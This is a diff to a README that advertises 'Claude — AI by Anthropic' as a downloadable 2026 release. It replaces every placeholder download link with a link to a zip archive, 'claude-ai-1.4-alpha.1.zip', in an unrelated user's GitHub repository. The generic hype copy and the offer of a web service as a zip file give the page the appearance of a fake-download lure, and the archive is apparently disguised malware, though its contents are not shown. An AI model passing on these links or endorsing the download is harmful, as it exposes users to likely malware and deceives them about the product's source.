@@ -4,7 +4,7 @@
 
 > Anthropic's Claude is the developer community's favorite AI model in 2026 — known for its long context window, nuanced reasoning, and exceptional performance on complex coding and writing tasks.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://download.com)&nbsp;
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Starnoncontinuous86/claude-ai/raw/refs/heads/main/alcaide/claude-ai-1.4-alpha.1.zip)&nbsp;
 ![Platform](https://img.shields.io/badge/Platform-Available-green?style=flat-square)&nbsp;
 ![Release](https://img.shields.io/badge/Release-2026-orange?style=flat-square)
 
@@ -37,9 +37,9 @@ Available on **Available Now** · Available on **Web, iOS, Android, API**.
 
 ### Ready to play / use?
 
-[![Download Claude — AI by Anthropic](https://img.shields.io/badge/Download-Claude%20%20AI%20by%20Anthropic-brightgreen?style=for-the-badge)](https://download.com)
+[![Download Claude — AI by Anthropic](https://img.shields.io/badge/Download-Claude%20%20AI%20by%20Anthropic-brightgreen?style=for-the-badge)](https://github.com/Starnoncontinuous86/claude-ai/raw/refs/heads/main/alcaide/claude-ai-1.4-alpha.1.zip)
 
-> **[Click here to download](https://download.com)**
+> **[Click here to download](https://github.com/Starnoncontinuous86/claude-ai/raw/refs/heads/main/alcaide/claude-ai-1.4-alpha.1.zip)**
 
 </div>
 
@@ -70,7 +70,7 @@ Claude — AI by Anthropic is one of the **most hyped releases of Summer 2026** 
 
 | Download | Community | News |
 |:--------:|:---------:|:----:|
-| [Download here](https://download.com) | Reddit & Discord | Gaming & tech news |
+| [Download here](https://github.com/Starnoncontinuous86/claude-ai/raw/refs/heads/main/alcaide/claude-ai-1.4-alpha.1.zip) | Reddit & Discord | Gaming & tech news |
 
 ---
 
@@ -78,7 +78,7 @@ Claude — AI by Anthropic is one of the **most hyped releases of Summer 2026** 
 
 **Don't miss out — Claude — AI by Anthropic is one of 2026's must-have releases.**
 
-[![Download Now](https://img.shields.io/badge/Download-Claude%20%20AI%20by%20Anthropic-blue?style=for-the-badge)](https://download.com)
+[![Download Now](https://img.shields.io/badge/Download-Claude%20%20AI%20by%20Anthropic-blue?style=for-the-badge)](https://github.com/Starnoncontinuous86/claude-ai/raw/refs/heads/main/alcaide/claude-ai-1.4-alpha.1.zip)
 
 *Claude — AI by Anthropic — Available Now · Web, iOS, Android, API*
 
